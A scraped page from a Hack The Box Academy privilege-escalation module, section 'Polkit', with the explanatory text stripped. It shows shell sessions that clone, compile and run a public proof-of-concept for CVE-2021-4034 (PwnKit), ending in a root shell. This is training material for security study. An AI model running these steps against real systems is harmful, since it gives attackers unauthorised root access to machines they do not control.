<!--
 // Platform: Academy
// URL: https://academy.hackthebox.com/module/51/section/1591
// Platform Version: V1
// Module ID: 51
// Module Name: Linux Privilege Escalation
// Module Difficulty: Easy
// Section ID: 1591
// Section Title: Polkit
// Page Title: Hack The Box - Academy
// Page Number: 25
-->

# Polkit

**Module Name:** Linux Privilege Escalation **Page Number:** 25

#### 

#### LINUX PRIVILEGE ESCALATION

# Polkit

``` shell-session
cry0l1t3@nix02:~$ # pkexec -u <user> <command>
cry0l1t3@nix02:~$ pkexec -u root id

uid=0(root) gid=0(root) groups=0(root)
```

``` shell-session
cry0l1t3@nix02:~$ git clone https://github.com/arthepsy/CVE-2021-4034.git
cry0l1t3@nix02:~$ cd CVE-2021-4034
cry0l1t3@nix02:~$ gcc cve-2021-4034-poc.c -o poc
```

``` shell-session
cry0l1t3@nix02:~$ ./poc

# id

uid=0(root) gid=0(root) groups=0(root)
```

# 

# 

#### Questions

####